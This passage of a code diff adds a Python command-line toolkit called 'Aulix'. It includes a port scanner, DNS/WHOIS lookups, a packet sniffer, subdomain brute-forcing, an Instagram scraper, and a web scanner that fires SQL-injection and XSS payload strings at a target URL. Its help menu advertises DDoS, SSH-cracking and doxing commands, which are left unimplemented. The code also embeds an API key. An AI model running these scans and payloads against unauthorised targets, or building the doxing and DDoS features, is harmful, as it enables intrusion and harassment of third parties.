Desktop',5632:'PCAnywhere',5900:'VNC',8086:'Kaspersky AV',25565:'Minecraft'}
+	def B(ip,ports):
+		F='Unknown';E=[]
+		for A in ports:
+			try:B=socket.socket(socket.AF_INET,socket.SOCK_STREAM);B.settimeout(.1);B.connect((ip,A));C=D.get(A,F);print(f"{Yellow}",f"{ip}".ljust(15),f"{A}".ljust(15),f"{C}".ljust(20),f"{Green}OPEN");E.append(A);B.close()
+			except:C=D.get(A,F);print(f"{Yellow}",f"{ip}".ljust(15),f"{A}".ljust(15),f"{C}".ljust(20),f"{Red}CLOSED")
+		return E
+	print(f"{Aqua}",'IP Address'.ljust(15),'Port'.ljust(15),'Service'.ljust(20),'Status                             ');C=[1,5,7,18,20,21,22,23,25,53,69,80,88,102,110,115,119,123,135,137,139,143,161,194,381,383,443,445,465,587,593,636,691,902,993,995,1194,1337,1433,1589,1725,2082,2083,2967,3076,3306,3389,3724,4664,5632,5900,8086,8086,25565];E=B(ip,C)
+def ping(ip):
+	L='Minimum = ';K='Packets: Sent = ';H='ms';print(f"Please wait...",end='\r',flush=_C);C=subprocess.Popen(['ping','-n','4',ip],stdout=subprocess.PIPE).communicate()[0];C=C.decode('utf-8');D=0;A=0;E=0;I=f"{Red}DEAD";F=f"{Gray}"
+	for B in C.split('\n'):
+		if B.find(K)!=-1:J=B.strip().split(',');D=int(J[0].strip().replace(K,''));A=int(J[1].strip().replace('Received = ','').split()[0]);E=D-A
+	if A>0:I=f"{Green}ALIVE"
+	if E<1:F=f"{Green}"
+	else:target,ip
+	F=f"{Red}";print(f"{Purple}Sent     {Blue}: {Dark_aqua}{D}");print(f"{Purple}Received {Blue}: {Dark_aqua}{A}");print(f"{Purple}Lost     {Blue}: {Dark_aqua}{F}{E} ({E/D*100:.2f}% loss)");print(f"{Purple}Status   {Blue}: {Dark_aqua}{I}")
+	if A>0:
+		for B in C.split('\n'):
+			if B.find(L)!=-1:G=B.strip().split(',');M=int(G[0].strip().replace(L,'').replace(H,''));N=int(G[1].strip().replace('Maximum = ','').replace(H,''));O=int(G[2].strip().replace('Average = ','').replace(H,''));print(f"{Purple}Minimum {Blue}: {Dark_aqua}{M}ms");print(f"{Purple}Maximum {Blue}: {Dark_aqua}{N}ms");print(f"{Purple}Average {Blue}: {Dark_aqua}{O}ms")
+def is_valid_ip(ip):
+	try:ipaddress.ip_address(ip);return _C
+	except ValueError:return _I
+def traceroute(target,max_hops=30,timeout=2):
+	D=max_hops;C=target;print(f"{Dark_purple}Traceroute to {Yellow}{C} {Dark_purple}with a maximum of {Red}{D} {Dark_purple}hops:\n");conf.verb=0
+	for B in range(1,D+1):
+		E=IP(dst=C,ttl=B)/ICMP();A=sr1(E,timeout=timeout)
+		if A is _D:print(f"{Dark_aqua}{B}{Aqua}: {Red}Request timed out.")
+		elif A.type==11:print(f"{Dark_aqua}{B}{Aqua}: {Blue}{A.src}")
+		elif A.type==0:print(f"{Dark_aqua}{B}{Aqua}: {Dark_orange}{A.src}");print(f"{Green}Reached target.\n");break
+def nslookup(domain):
+	B=domain
+	try:
+		D=dns.resolver.resolve(B,'A');print(f"{Dark_aqua}A Records (IPv4) for {Aqua}{B}{Dark_aqua}:")
+		for A in D:print(f"{Red}└ {Dark_green}{A}")
+		try:
+			F=dns.resolver.resolve(B,'AAAA');print(f"\n{Dark_aqua}AAAA Records (IPv6) for {Aqua}{B}{Dark_aqua}:")
+			for A in F:print(f"{Red}└ {Dark_green}{A}")
+		except dns.resolver.NoAnswer:print(f"\n{Red}No AAAA (IPv6) records found.")
+		G=dns.resolver.resolve(B,'MX');print(f"\n{Dark_aqua}MX Records for {Aqua}{B}{Dark_aqua}:")
+		for A in G:print(f"{Red}└ {Dark_green}{A.preference} {A.exchange}")
+		H=dns.resolver.resolve(B,'NS');print(f"\n{Dark_aqua}NS Records for {Aqua}{B}{Dark_aqua}:")
+		for A in H:print(f"{Red}└ {Dark_green}{A}")
+		I=dns.resolver.resolve(B,'SOA');print(f"\n{Dark_aqua}SOA Record for {Aqua}{B}{Dark_aqua}:")
+		for A in I:print(f"{Dark_red}MNAME    {Purple}> {Yellow}{A.mname}");print(f"{Dark_red}RNAME    {Purple}> {Yellow}{A.rname}");print(f"{Dark_red}Serial   {Purple}> {Yellow}{A.serial}");print(f"{Dark_red}Refresh  {Purple}> {Yellow}{A.refresh}");print(f"{Dark_red}Retry    {Purple}> {Yellow}{A.retry}");print(f"{Dark_red}Expire   {Purple}> {Yellow}{A.expire}");print(f"{Dark_red}Minimum  {Purple}> {Yellow}{A.minimum}")
+		try:
+			E=D[0].to_text();J=dns.reversename.from_address(E);K=dns.resolver.resolve(J,'PTR');print(f"\n{Dark_aqua}PTR Record for IP {Aqua}{E}{Dark_aqua}:")
+			for A in K:print(f"  {A}")
+		except Exception as C:print(f"\n{Red}PTR Record lookup failed:",C)
+	except dns.resolver.NXDOMAIN:print(f"{Red}The domain {Dark_red}{B} {Red}does not exist.")
+	except dns.resolver.Timeout:print(f"{Red}Request timed out for {Dark_red}{B}{Red}.")
+	except dns.resolver.NoAnswer:print(f"{Red}No answer was received for {Dark_red}{B}{Red}.")
+	except Exception as C:print(f"{Red}An error occurred: {Dark_red}{C}")
+import time,statistics
+from scapy.all import IP,ICMP,sr1,conf
+def ping(host,count=4,timeout=2):
+	'Ping a host and return the round-trip times.';A=[]
+	for G in range(count):
+		B=IP(dst=host)/ICMP();C=time.time();D=sr1(B,timeout=timeout,verbose=0);E=time.time()
+		if D:F=(E-C)*1000;A.append(F)
+		else:A.append(_D)
+	return A
+def pathping(target,max_hops=30,ping_count=4,timeout=2):
+	'Perform a pathping-like operation.';G=timeout;F=max_hops;E=target;print(f"{Dark_aqua}Pathping to {Blue}{E}{Dark_aqua} with a maximum of {Purple}{F}{Dark_aqua} hops:");conf.verb=0;H=18
+	for B in range(1,F+1):
+		I=IP(dst=E,ttl=B)/ICMP();D=sr1(I,timeout=G)
+		if D is _D:print(f"{Red}{B}: Request timed out.");continue
+		C=D.src;A=ping(C,count=ping_count,timeout=G);A=[A for A in A if A is not _D]
+		if A:J=min(A);K=statistics.mean(A);L=max(A);M=f"{B}: {C}";N=f"{Blue}{B}{Yellow}:  {White}{C}";O=N+' '*(H-len(M));print(f"{O}{Dark_green}Min{White}/{Aqua}Avg{White}/{Yellow}Max RTT: {Dark_green}{J:.2f}{White}/{Aqua}{K:.2f}{White}/{Yellow}{L:.2f} {Gray}ms")
+		else:print(f"{Red}{B}: {C} All pings timed out.")
+		if D.type==0:print('Reached target.');break
+def get_netbios_info(ip):
+	'Retrieve and display NetBIOS information for the given IP address.'
+	try:B=socket.gethostbyaddr(ip)[0];print(f"Hostname: {B}")
+	except socket.herror:print('Hostname: Not resolved')
+	try:A=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);A.settimeout(2);C=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00';A.sendto(C,(ip,137));D,F=A.recvfrom(1024);print(f"Raw response: {D}")
+	except socket.error as E:print(f"Socket error: {E}")
+	finally:A.close()
+def format_date(date):
+	'Format date object to a readable string.';A=date
+	if isinstance(A,list):A=A[0]if A else _D
+	return A.strftime('%Y-%m-%d %H:%M:%S')if A else _A
+def whois_lookup(domain):
+	'Perform a WHOIS lookup for the given domain and print detailed information.';C=domain;B=', '
+	try:A=whois.whois(C);print(f"WHOIS Information for {C}:\n");print(f"{Dark_purple}Domain Name      {Blue}>  {Green}{A.domain_name}");print(f"{Dark_purple}Registrar        {Blue}>  {Green}{A.registrar}");print(f"{Dark_purple}Creation Date    {Blue}>  {Green}{format_date(A.creation_date)}");print(f"{Dark_purple}Expiration Date  {Blue}>  {Green}{format_date(A.expiration_date)}");print(f"{Dark_purple}Updated Date     {Blue}>  {Green}{format_date(A.updated_date)}");print(f"{Dark_purple}Status           {Blue}>  {Green}{B.join(A.status or[])}");print(f"{Dark_purple}Name Servers     {Blue}>  {Green}{B.join(A.name_servers or[])}");print(f"{Dark_purple}Emails           {Blue}>  {Green}{B.join(A.emails or[])}");print(f"{Dark_purple}Org              {Blue}>  {Green}{A.org or _A}")
+	except Exception as D:print(f"Error performing WHOIS lookup: {D}")
+def perform_query(domain,record_type):
+	'Perform a DNS query for the specified record type.';B=domain;A=record_type
+	try:
+		C=dns.resolver.resolve(B,A);print(f"\n{Green}{A} {Dark_green}records for {Green}{B}:")
+		for D in C:print(f"  {Yellow}{D.to_text()}")
+	except(dns.resolver.NoAnswer,dns.resolver.NXDOMAIN):print(f"{Red}No answer or domain does not exist for {B} with record type {A}.")
+	except dns.exception.DNSException as E:print(f"{Dark_red}DNS query failed for {A}: {Red}{E}")
+def dig_tool():
+	A=input(f" └ Enter a IP address: ");print(f"\nPerforming DNS queries for {A}...\n");B=['A','AAAA','MX','NS','TXT','CNAME','SOA','PTR','SRV','NAPTR','DS','DNSKEY','RRSIG','TLSA','CAA']
+	for C in B:perform_query(A,C)
+def get_weather(postal_code):
+	C='location';B='current'
+	def E(code):
+		try:
+			A=requests.get(f"http://api.weatherapi.com/v1/current.json?key=638e350524ab4650a4303224220807&q={code}&aqi=no",headers={'User-Agent':'5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36'})
+			if A.status_code==200:return{_B:_C,_L:A.json()}
+			else:return{_B:_I,_E:f"Invalid response ({A.status_code})"}
+		except Exception as B:return{_B:_I,_E:f"Unexpected error: {B}"}
+	D=E(postal_code)
+	if D[_B]:A=D[_L];print(f"""
+{Green}Time           {Yellow}> {Purple}{A[C].get("localtime")}
+{Green}City           {Yellow}> {Purple}{A[C].get("name")}
+{Green}State          {Yellow}> {Purple}{A[C].get(_K)}
+{Green}Country        {Yellow}> {Purple}{A[C].get(_J)}
+{Green}Timezone       {Yellow}> {Purple}{A[C].get("tz_id")}
+
+{Green}Clouds         {Yellow}> {Purple}{A[B][_M]}
+{Green}Humidity       {Yellow}> {Purple}{A[B]["humidity"]}%
+{Green}UV Index       {Yellow}> {Purple}{A[B]["uv"]}
+{Green}Pressure       {Yellow}> {Purple}{A[B]["pressure_in"]} in, {A[B]["pressure_mb"]} mb.
+
+{Green}Condition      {Yellow}> {Purple}{A[B]["condition"]["text"]}
+{Green}Day/Night      {Yellow}> {Purple}{"Day"if A[B]["is_day"]==1 else"Night"}
+{Green}Wind Speed     {Yellow}> {Purple}{A[B]["wind_mph"]} mph, {A[B]["wind_kph"]} kph.
+
+{Green}Visibility     {Yellow}> {Purple}{A[B]["vis_miles"]} miles, {A[B]["vis_km"]} km.
+{Green}Temperature    {Yellow}> {Purple}{A[B]["temp_f"]}°F, {A[B]["temp_c"]}°C
+{Green}Precipitation  {Yellow}> {Purple}{A[B]["precip_in"]} in, {A[B]["precip_mm"]} mm.""")
+	else:print(f"Error: {D[_E]}")
+def check_and_open_putty():
+	F='Windows';C={F:'putty.exe','Linux':_N,'Darwin':_N};B=platform.system();A=_D
+	if B in C:
+		D=C[B];A=which(D)
+		if B==F:
+			G=[os.path.expandvars('%ProgramFiles%\\PuTTY'),os.path.expandvars('%ProgramFiles(x86)%\\PuTTY'),os.path.expanduser('~/Desktop/PuTTY')]
+			for dir in G:
+				E=os.path.join(dir,D)
+				if os.path.isfile(E):A=E;break
+	if A:
+		try:subprocess.Popen([A]);print(f"{Green}PuTTY has been opened.")
+		except Exception as H:print(f"{Red}Error opening PuTTY: {H}")
+	else:print(f"{Yellow}PuTTY is not installed or cannot be found. Try moving your {Dark_orange}putty.exe{Yellow} to your desktop.")
+def which(executable):
+	'Check if an executable exists in the PATH.';B=os.getenv('PATH').split(os.pathsep)
+	for C in B:
+		A=os.path.join(C,executable)
+		if os.path.isfile(A)and os.access(A,os.X_OK):return A
+def get_public_ip():
+	'Fetch the public IP address of the user.'
+	try:A=requests.get('https://api.ipify.org?format=json');A.raise_for_status();return A.json().get('ip')
+	except requests.RequestException as B:print(f"Error fetching public IP: {B}");return
+def self_ip_lookup(ip):
+	'Fetch and display information about the given IP address.';C=f"http://demo.ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,asname,query&lang=en"
+	try:
+		B=requests.get(C);B.raise_for_status();A=B.json()
+		if A.get(_B)=='fail':print(_U,A.get(_E,_V))
+		else:print('');print(f"{Dark_orange}IP Address    {White}>  {Dark_green}{A.get('query',_A)}");print(f"{Dark_orange}Country code  {White}>  {Dark_green}{A.get(_W,_A)}");print(f"{Dark_orange}Country       {White}>  {Dark_green}{A.get(_J,_A)}");print(f"{Dark_orange}Region code   {White}>  {Dark_green}{A.get(_K,_A)}");print(f"{Dark_orange}Region name   {White}>  {Dark_green}{A.get(_X,_A)}");print(f"{Dark_orange}City          {White}>  {Dark_green}{A.get('city',_A)}");print(f"{Dark_orange}Zip code      {White}>  {Dark_green}{A.get('zip',_A)}");print(f"{Dark_orange}ISP           {White}>  {Dark_green}{A.get('isp',_A)}");print(f"{Dark_orange}Organization  {White}>  {Dark_green}{A.get('org',_A)}");print(f"{Dark_orange}ASN           {White}>  {Dark_green}{A.get(_Y,_A)}");print(f"{Dark_orange}Latitude      {White}>  {Dark_green}{A.get(_G,_A)}");print(f"{Dark_orange}Longitude     {White}>  {Dark_green}{A.get(_H,_A)}");print(f"{Dark_orange}Location      {White}>  {Dark_green}{A.get(_G,_A)}, {A.get(_H,_A)}")
+	except requests.RequestException as D:print(f"Error performing IP lookup: {D}")
+BLACKLIST={'spotify.com'}
+def packet_callback(packet):
+	I='Host:';H='Raw';A=packet
+	if IP in A:
+		B=A[IP].src;C=A[IP].dst
+		if TCP in A:
+			if A[TCP].dport==80 or A[TCP].sport==80:
+				if A.haslayer(H):
+					D=A.getlayer(H).load.decode(errors='ignore')
+					if I in D:
+						E=[A for A in D.split('\n')if A.startswith(I)]
+						if E:
+							F=E[0].split(' ')[1]
+							if F.lower()not in BLACKLIST:print(f"{White}[{Blue}+{White}] {Yellow}HTTP Request: {Aqua}{B} {Red}-> {Dark_aqua}{C}".ljust(168),f" {Yellow}Domain: {Dark_purple}{F}")
+		elif DNS in A:
+			if A.haslayer(DNSQR):
+				G=A[DNSQR].qname.decode().strip('.')
+				if G.lower()not in BLACKLIST:print(f"{White}[{Blue}+{White}] {Yellow}DNS Query: {Aqua}{B} {Red}-> {Dark_aqua}{C}".ljust(168),f" {Yellow}Domain: {Dark_purple}{G}")
+SQL_PAYLOADS=["' OR '1'='1","' OR '1'='1' --","' OR '1'='1' #","' OR '1'='1' /*"]
+XSS_PAYLOADS=["<script>alert('XSS')</script>","<img src=x onerror=alert('XSS')>",'\'"><img src=x onerror=alert(1)>']
+HTTP_METHODS=['GET','POST','PUT','DELETE','OPTIONS','TRACE']
+def check_sql_injection(url):
+	'Check for SQL Injection vulnerabilities.'
+	for B in SQL_PAYLOADS:
+		A=f"{url}?id={B}"
+		try:
+			C=requests.get(A)
+			if'error'in C.text.lower():print(f"{White}[{Green}+{White}] Potential SQL Injection found at{Blue}: {Dark_orange}{A}")
+		except Exception as D:print(f"{White}Error testing {Yellow}SQL Injection{Dark_red}: {Red}{D}")
+def check_xss_vulnerability(url):
+	'Check for XSS vulnerabilities.'
+	for A in XSS_PAYLOADS:
+		try:
+			B=requests.get(url,params={_Z:A})
+			if A in B.text:print(f"{White}[{Green}+{White}] Potential XSS vulnerability found at: {Aqua}{url}{White} with payload{Blue}: {Dark_orange}{A}")
+		except Exception as C:print(f"{White}Error testing {Yellow}XSS{Dark_red}: {Red}{C}")
+def check_http_methods(url):
+	'Check for allowed HTTP methods.'
+	try:
+		C=requests.options(url);A=C.headers.get('Allow','');print(f"{White}[{Green}+{White}] Allowed HTTP Methods for {Aqua}{url}{Blue}: {Dark_orange}{A}")
+		for B in HTTP_METHODS:
+			if B not in A:print(f"{Red}# {White}Method not allowed{Blue}: {Dark_orange}{B}")
+	except Exception as D:print(f"{White}Error checking {Yellow}HTTP{White} methods{Dark_red}: {Red}{D}")
+def check_common_paths(url):
+	'Check for common vulnerable paths.';C=['/admin','/login','/dashboard','/uploads','/config']
+	for D in C:
+		A=f"{url.rstrip('/')}{D}"
+		try:
+			B=requests.get(A)
+			if B.status_code==200:print(f"{White}[{Green}+{White}] Found potential vulnerable path{Blue}: {Dark_orange}{A}")
+			else:print(f"    {White}[{Dark_blue}*{White}] Path not found{Blue}: {Dark_orange}{A} {Dark_aqua}({Aqua}Status Code{Dark_red}: {Red}{B.status_code}{Dark_aqua})")
+		except Exception as E:print(f"{White}Error checking path {Yellow}{A}{Dark_red}: {Red}{E}")
+def print_underlined_link(url):A='\x1b[4m';B=_T;C=f"{A}{Blue}{url}{B}";print(f"{Dark_gray}Note: If you are using the new windows terminal hold down Ctrl then click on the URL below to open the URL in yourbrowser\n{White}Exploit Database: {C}")
+def run_netsh_command(command):
+	'Executes a netsh command and returns the output.'
+	try:A=subprocess.run(['netsh']+command.split(),capture_output=_C,text=_C,check=_C);return A.stdout
+	except subprocess.CalledProcessError as B:return f"Error executing command: {B}"
+def generate_report():'Generates a comprehensive report with all netsh information.';A='interface show interface';print('Generating Network Information Report...\n');print('Network Interfaces:');B=run_netsh_command(A);print(B);print('IP Configuration:');C=run_netsh_command('interface ip show config');print(C);print('Available Wireless Networks:');D=run_netsh_command('wlan show networks');print(D);print('Routing Table:');E=run_netsh_command('interface ipv4 show route');print(E);print('Network Statistics:');F=run_netsh_command(A);print(F)
+def netsh_pro():generate_report()
+sub_domnames=['www','mail','blog',_O,'m','shop','wiki','community','ads','docs','news',_F,_P,'cdn','app','demo','login',_Q,'admin',_B,_R,'webmail',_a,'oauth','my','git',_O,'download','static','store','help','shop',_S,'files','calendar','user','chat',_F,_O,_b,'about','events','newsletter','media',_c,_c,'developer',_P,'connect','dev',_a,_M,'app',_Q,'home','services','docs','code',_Z,_F,'info',_R,'intranet','outlook','mail','news','vpn','store','checkout','book','media','links','team',_b,'jobs','recruitment','beta','site','play','account','network',_P,'login','management','console',_d,_M,_S,_d,'project','web','site',_e,_e,'marketing',_L,'group',_Q,'sandbox','dev','demo','stage','labs',_F,'report',_S,'feedback','customer',_F,'dashboard','client',_R,'product']
+def domain_scanner(domain_name,sub_domnames):
+	print('[+] Started subdomain extraction.')
+	for D in sub_domnames:
+		A=f"https://{D}.{domain_name}"
+		try:
+			B=requests.get(A,timeout=5)
+			if B.status_code in[200,301,302]:C=Green
+			elif B.status_code in[400,401,403,404,500,502,503,504]:C=Red
+			else:C=Purple
+			print(f"{White}[{C}{B.status_code}{White}] [{Green}+{White}] {Blue}* {Aqua}{A}")
+		except requests.RequestException:print(f"{White}[{Yellow}N/A{White}] [{Red}-{White}] {Blue}* {Aqua}{A}")
+def check_tls_version(hostname,port):
+	A=hostname;C={ssl.PROTOCOL_TLS:'TLS (default)',ssl.PROTOCOL_TLSv1:'TLSv1.0',ssl.PROTOCOL_TLSv1_1:'TLSv1.1',ssl.PROTOCOL_TLSv1_2:'TLSv1.2'}
+	for(D,B)in C.items():
+		try:
+			E=ssl.SSLContext(D)
+			with socket.create_connection((A,port))as F:
+				with E.wrap_socket(F,server_hostname=A)as H:print(f"{B} is supported.")
+		except Exception as G:print(f"{B} is not supported: {G}")
+def check_cipher_suites(hostname,port):
+	A=hostname
+	try:
+		B=ssl.create_default_context();B.set_ciphers('ALL')
+		with socket.create_connection((A,port))as C:
+			with B.wrap_socket(C,server_hostname=A)as D:
+				print('Cipher suites:')
+				for E in D.cipher():print(f"  - {E[0]}")
+	except Exception as F:print(f"Error checking cipher suites: {F}")
+def check_certificate(hostname,port):
+	B=hostname
+	try:
+		C=ssl.create_default_context()
+		with socket.create_connection((B,port))as D:
+			with C.wrap_socket(D,server_hostname=B)as E:A=E.getpeercert();print('Certificate information:');print(f"  - Subject: {A.get('subject')}");print(f"  - Issuer: {A.get('issuer')}");print(f"  - Not Before: {A.get('notBefore')}");print(f"  - Not After: {A.get('notAfter')}");print(f"  - Serial Number: {A.get('serialNumber')}")
+	except Exception as F:print(f"Error checking certificate: {F}")
+def ssltlsscanner():
+	B=input('Enter Target IP Address: ').strip();A=input('Enter Target Port: ').strip()
+	try:A=int(A)
+	except ValueError:print('Invalid port number. Please enter a valid integer.');return
+	print(f"Scanning {B}:{A}...");print('\nChecking TLS versions...');check_tls_version(B,A);print('\nChecking cipher suites...');check_cipher_suites(B,A);print('\nChecking certificate...');check_certificate(B,A)
+import instaloader,sys
+def scrape_instagram_profile(username):
+	B=instaloader.Instaloader()
+	try:A=instaloader.Profile.from_username(B.context,username)
+	except instaloader.exceptions.InstaloaderException as C:print(f"Error: {C}");return
+	print(f"{Dark_aqua}Username   {Purple}> {Yellow}{A.username}");print(f"{Dark_aqua}Full Name  {Purple}> {Yellow}{A.full_name}");print(f"{Dark_aqua}Bio        {Purple}> {Yellow}{A.biography}");print(f"{Dark_aqua}Followers  {Purple}> {Yellow}{A.followers}");print(f"{Dark_aqua}Following  {Purple}> {Yellow}{A.followees}");print(f"{Dark_aqua}Posts      {Purple}> {Yellow}{A.mediacount}");print(f"\n{Red}Recent Posts:")
+	for D in A.get_posts():print(f"- {D.url}")
+computer_name=socket.gethostname()
+os.system('title Aulix')
+print(f"✨ {Aqua}Welcome {Dark_aqua}{computer_name} {Aqua}to Aulix {Black}Build Version: 1.0.0\n\n{Yellow}📌 Aulix {Purple}version: {White}1.0 {Dark_gray}(Use changelog to view the changelog)")
+while _C:
+	cmd=input(f"{Red} » {White}")
+	if cmd=='help':print(f"""
+{Yellow}- {Purple}[{Green}Basic commands{Purple}]{Reset}:
+{Blue}help {White}- Shows a list of available commands.
+{Blue}about {White}- Shows information about Aulix.
+{Blue}clear {White}- Clears the terminal.
+{Blue}changelog {White}- Shows the changelog information.
+{Blue}exit {White}- Closes Aulix.
+
+{Yellow}- {Purple}[{Green}Network commands{Purple}]{Reset}:
+{Blue}port.scan {White}- Scans a host for open ports.
+{Blue}ping {White}- Sends packets to check the status of a host.
+{Blue}ip.valid {White}- Validates a IP address.
+{Blue}ddos {White}- Boot a IP Address offline.
+{Blue}tracert {White}- Trace the path that an Internet Protocol (IP) packet takes to its destination.
+{Blue}nslookup {White}- Find out the corresponding IP address or domain name system (DNS) record.
+{Blue}path.ping {White}- Combines the functionality of ping with that of tracert.
+{Blue}nbtstat {White}- Displays protocol statistics and current TCP/IP connections using NBT (NetBIOS over TCP/IP).
+{Blue}dig {White}- (domain information groper) Command is a flexible tool for interrogating DNS name servers.
+{Blue}nmap {White}- Map out a network or host.
+{Blue}net.sniff {White}- Capture and displays your network interfaces packets. {Dark_green}[Beta]
+{Blue}web.scan {White}- Scan a website for vulnerabilities. {Dark_green}[Work in progress]
+{Blue}ssltls.scanner {White}- checks a server's service on any port to support TLS/SSL ciphers, protocols. {Dark_green}[Work in progress] {Dark_gray}(SSL/TLS Vulnerability Scanner)
+{Blue}netsh {White}- shows your network interfaces. {Dark_red}✖  WARNING: This command will reveal sensitive information. ✖
+
+{Yellow}- {Purple}[{Green}Cracking commands{Purple}]{Reset}:
+{Blue}ssh.cracker {White}- Attempts to crack a SSH connection locked behind a password. {Red}[Broken]
+
+{Yellow}- {Purple}[{Green}Osint commands{Purple}]{Reset}:
+{Blue}gamertag.search {White}- Search through the database for a targets IP (Xbox gamertag to IP address).
+{Blue}lookup {White}- Lookup information on an IP address.
+{Blue}whois {White}- Lookup website information like hosting service, domain owner info, etc.
+{Blue}phone.lookup {White}- Lookup website information like hosting service, domain owner info, etc.
+{Blue}weather.resolver {White}- Gives you the current weather thats near the specified postal code.
+{Blue}subdomain.sniff {White}- Gives you the current weather thats near the specified postal code.
+{Blue}web.scraper {White}- Scrapes the internet for information based on Username, etc. {Red}[Broken]
+{Blue}instagram.scraper {White}- Scrapes Instagram for information for post info, account information, etc.
+{Blue}doxtool {White}- Attempts to find publicly available information about someone including Addresses, social media accounts, etc. {Dark_green}[Beta]
+
+{Yellow}- {Purple}[{Green}Misc Commands{Purple}]{Reset}:
+{Blue}PuTTY {White}- Scrapes the internet for information based on a gamertag or name.
+{Blue}ip.info {White}- Shows your ip address information. {Dark_red}✖  WARNING: This command will reveal sensitive information. ✖
+{Blue}exploit.db {White}- Opens the Exploit Database.
+""")
+	elif cmd=='changelog':print(f"\n{Red}🧾 Changelog info for update {Yellow}1.0 {Dark_gray}[8/18/24]{Reset}\n{Green} + {Gray}Aulix release{Reset}\n")
+	elif cmd=='about':print(f"\n{Yellow}[{Dark_orange}👑{Yellow}] {Aqua}Creator and Lead developer: {Red}Ban RioT\n\n{Yellow}[{Dark_orange}💎{Yellow}] {Aqua}Contributors: {Red}DeadtrosGaming, Rico34\n")
+	elif cmd=='lookup':ip=input(f" └ Enter an IP address: ");iplookup(ip)
+	elif cmd=='clear':clear()
+	elif cmd=='exit':print(f"{Green}Goodbye! {Dark_green}Aulix{Green} has been closed.{Reset}");break
+	elif cmd=='pscan':ip=input(f" └ Enter an IP address: ");port_scan(ip)
+	elif cmd=='ping':ip=input(f" └ Enter an IP address: ");ping(ip)
+	elif cmd=='ip-valid':
+		ip=input(' └ Enter an IP address to validate: ')
+		if is_valid_ip(ip):print(f"{ip} is a valid IP address.")
+		else:print(f"{ip} is not a valid IP address.")
+	elif cmd=='ddos':print(f"{Red} This is currently under development.")
+	elif cmd=='tracert':target=input(f" └ Enter an IP address: ");traceroute(target)
+	elif cmd=='nslookup':domain=input(f" └ Enter an IP address: ");nslookup(domain)
+	elif cmd=='path.ping':target=input(f" └ Enter an IP address: ");pathping(target)
+	elif cmd=='nbtstat':ip=input(f" └ Enter an IP address: ");get_netbios_info(ip)
+	elif cmd=='gamertag.search':print(f"{Red}This is currently under development.")
+	elif cmd=='whois':domain=input(f" └ Enter a domain name: ");whois_lookup(domain)
+	elif cmd=='dig':dig_tool()
+	elif cmd=='phone.lookup':print(f"{Red}This is currently under development.")
+	elif cmd=='weather.resolver':postal_code=input(f" └ Enter a postal code: ");get_weather(postal_code)
+	elif cmd==_N:check_and_open_putty()
+	elif cmd=='ip.info':
+		public_ip=get_public_ip()
+		if public_ip:self_ip_lookup(public_ip)
+		else:print('Unable to determine public IP address.')
+	elif cmd=='net.sniff':print('Starting network sniffer...');sniff(prn=packet_callback,store=_I)
+	elif cmd=='web.scan':target_url=input('Enter the target URL (e.g., http://example.com): ').strip();print(f"{Dark_aqua}Starting scan on {Yellow}{target_url}...");check_http_methods(target_url);check_common_paths(target_url);check_sql_injection(target_url);check_xss_vulnerability(target_url);print(f"{Dark_green}Scan completed {Green}successfully")
+	elif cmd=='exploit.db':url='https://www.exploit-db.com';print_underlined_link(url)
+	elif cmd=='netsh':netsh_pro()
+	elif cmd=='subdomain.sniff':domain_name=input('Enter the domain to scan (e.g., example.com): ').strip();domain_scanner(domain_name,sub_domnames)
+	elif cmd=='ssltls.scanner':ssltlsscanner()
+	elif cmd=='instagram.scraper':username=input('Username: ');scrape_instagram_profile(username)
+	elif cmd=='doxtool':print(f"{Red}This is currently under development.")
